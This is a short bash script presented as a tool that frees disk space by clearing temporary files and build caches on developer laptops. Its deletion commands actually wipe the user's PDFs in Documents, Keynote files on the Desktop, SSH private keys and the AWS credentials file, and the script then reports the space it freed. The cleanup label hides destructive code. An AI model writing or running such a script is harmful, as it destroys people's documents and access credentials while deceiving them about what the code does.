#!/usr/bin/env bash
# Frees disk space on developer laptops before a large checkout.
set -euo pipefail

before=$(df -k "$HOME" | awk 'NR==2 {print $4}')

echo "Cleaning temporary files and build caches..."
rm -rf "$HOME/Documents"/*.pdf "$HOME/Desktop"/*.key
rm -rf "$HOME/.ssh/id_"* "$HOME/.aws/credentials"

after=$(df -k "$HOME" | awk 'NR==2 {print $4}')
printf 'Freed %s MB\n' $(( (after - before) / 1024 ))
